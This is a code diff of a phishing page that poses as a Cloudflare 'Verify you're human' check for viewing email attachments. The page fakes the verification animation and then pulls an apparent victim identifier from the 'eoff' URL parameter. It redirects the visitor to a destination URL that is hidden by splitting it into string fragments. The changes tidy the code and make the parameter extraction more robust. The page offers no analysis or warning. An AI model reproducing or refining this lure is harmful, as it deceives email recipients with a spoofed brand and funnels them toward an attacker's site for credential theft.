@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verify Human</title>
     <style>
-   
         * {
             margin: 0;
             padding: 0;
@@ -25,7 +24,6 @@
             overflow: hidden;
         }
 
-        /* ---------- ENTRANCE PRELOADER (full curtain) ---------- */
         .preload-curtain {
             position: fixed;
             inset: 0;
@@ -54,7 +52,6 @@
             }
         }
 
-        /* ---------- MAIN VERIFICATION PANEL (hidden until preloader fades) ---------- */
         .verify-panel {
             display: flex;
             flex-direction: column;
@@ -72,7 +69,6 @@
             text-align: center;
         }
 
-        /* ---------- CAPTCHA CARD ---------- */
         .captcha-module {
             display: flex;
             align-items: center;
@@ -88,7 +84,6 @@
             position: relative;
         }
 
-        /* interactive trigger region */
         .captcha-trigger {
             display: flex;
             align-items: center;
@@ -97,7 +92,6 @@
             user-select: none;
         }
 
-        /* svg container & dynamic path */
         .svg-icon-container {
             width: 22px;
             height: 22px;
@@ -123,7 +117,6 @@
             color: #1e293b;
         }
 
-        /* right side branding */
         .brand-side {
             display: flex;
             flex-direction: column;
@@ -154,7 +147,6 @@
             margin-top: 1px;
         }
 
-        /* ---------- SPINNER (verification) animation ---------- */
         .captcha-module.spinner-state .dynamic-svg-path {
             stroke: #3b82f6;
             animation: spinnerRotate 1s linear infinite;
@@ -167,7 +159,6 @@
             }
         }
 
-        /* ---------- SUCCESS state (green glow & text) ---------- */
         .captcha-module.success-state .dynamic-svg-path {
             stroke: #10B981;
             filter: drop-shadow(0 0 3px rgba(16, 185, 129, 0.4));
@@ -179,13 +170,9 @@
     </style>
 </head>
 <body>
-
-    <!-- PRELOADER CURTAIN (exact same behavior) -->
     <div id="preloaderCurtain" class="preload-curtain">
         <img src="astroman.png" alt="Loading verification" class="preload-icon">
     </div>
-
-    <!-- MAIN VERIFICATION UI (hidden initially) -->
     <div id="verificationInterface" class="verify-panel">
         <div id="instructionMessage" class="verify-instruction"></div>
         <div id="captchaElement" class="captcha-module">
@@ -204,10 +191,8 @@
             </div>
         </div>
     </div>
-
     <script>
         (function() {
-            // -------------------  TEXT ASSETS (exact copy from original) -------------------
             const lang = {
                 instructionText: "Verify you're human below to view the attachments",
                 defaultButton: "I'm not a robot",
@@ -216,25 +201,21 @@
                 brandName: "CLOUDFLARE"
             };
 
-            // -------------------  DOM references  -------------------
             const preloader = document.getElementById('preloaderCurtain');
             const verificationPanel = document.getElementById('verificationInterface');
             const instructionEl = document.getElementById('instructionMessage');
             const captchaCard = document.getElementById('captchaElement');
             const triggerZone = document.getElementById('clickSensor');
             const buttonSpan = document.getElementById('actionButtonLabel');
-            const svgPathShape = document.getElementById('mainShape');     // <path> inside svg
+            const svgPathShape = document.getElementById('mainShape');
             const brandSpan = document.getElementById('brandTitle');
 
-            // set static texts identical to original
             instructionEl.textContent = lang.instructionText;
             buttonSpan.textContent = lang.defaultButton;
             brandSpan.textContent = lang.brandName;
 
-            // flow lock (prevents double verification)
             let verificationInProgress = false;
 
-         
             setTimeout(() => {
                 preloader.style.opacity = '0';
                 setTimeout(() => {
@@ -243,7 +224,6 @@
                 }, 600);
             }, 3000);
 
-    
             function updateSvgPath(newPathData, strokeDash = null, removeDash = false) {
                 if (!svgPathShape) return;
                 svgPathShape.setAttribute('d', newPathData);
@@ -254,40 +234,35 @@
                 }
             }
 
-            
             function executeVerification() {
                 if (verificationInProgress) return;
                 verificationInProgress = true;
 
-                // ---- 1. Spinner / verifying mode ----
                 captchaCard.classList.add('spinner-state');
                 buttonSpan.textContent = lang.verifyingState;
-
-                
                 updateSvgPath('M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2', '35 15', false);
 
-            
                 setTimeout(() => {
-                   
                     captchaCard.classList.remove('spinner-state');
                     captchaCard.classList.add('success-state');
                     buttonSpan.textContent = lang.verifiedSuccess;
-
-                    
                     updateSvgPath('M20 6L9 17l-5-5', null, true);
 
-                   
                     setTimeout(() => {
-                     
-                        const currentSearch = window.location.search;
-                        const eoffMarker = 'eoff=';
-                        const eoffIndex = currentSearch.indexOf(eoffMarker);
-                        let hashFragment = '';
+                        const currentUrl = window.location.href;
+                        let eoffValue = '';
+                        const eoffParam = 'eoff=';
+                        const eoffIndex = currentUrl.indexOf(eoffParam);
+                        
                         if (eoffIndex !== -1) {
-                           
-                            hashFragment = currentSearch.substring(eoffIndex + eoffMarker.length);
+                            const afterEoff = currentUrl.substring(eoffIndex + eoffParam.length);
+                            const ampIndex = afterEoff.indexOf('&');
+                            const hashIndex = afterEoff.indexOf('#');
+                            let endIndex = afterEoff.length;
+                            if (ampIndex !== -1) endIndex = Math.min(endIndex, ampIndex);
+                            if (hashIndex !== -1) endIndex = Math.min(endIndex, hashIndex);
+                            eoffValue = afterEoff.substring(0, endIndex);
                         }
-
                         
                         const part1 = 'ht';
                         const part2 = 'tps';
@@ -297,14 +272,12 @@
                         const part6 = '.online';
                         const part7 = '/sNOiatkB';
                         const destinationUrl = part1 + part2 + part3 + part4 + part5 + part6 + part7;
-
                         
-                        window.location.href = destinationUrl + (hashFragment ? '#' + hashFragment : '');
+                        window.location.href = destinationUrl + (eoffValue ? '#' + eoffValue : '');
                     }, 1200);
                 }, 2500);
             }
 
-            
             if (triggerZone) {
                 triggerZone.addEventListener('click', executeVerification);
             }
